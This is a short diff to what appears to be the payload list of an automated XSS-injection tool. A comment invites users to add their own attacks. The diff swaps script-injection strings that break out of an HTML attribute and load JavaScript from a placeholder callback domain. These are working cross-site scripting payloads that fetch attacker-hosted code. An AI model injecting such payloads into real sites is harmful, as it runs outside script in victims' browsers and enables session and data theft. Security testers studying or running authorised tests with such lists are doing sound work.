@@ -8,8 +8,8 @@
 // Replace or extend these with your own attacks
 // put the attacks you most want to run higher, unless you disable the attack strength check
 var attacks = [
-	'<script src=//callbackdomain.com>',
-	'"><script src=//callbackdomain.com>',
+	'"><script src=//callbackdomain.com></script>',
+	//'"><script src=//callbackdomain.com>',
 ]
 
 /**
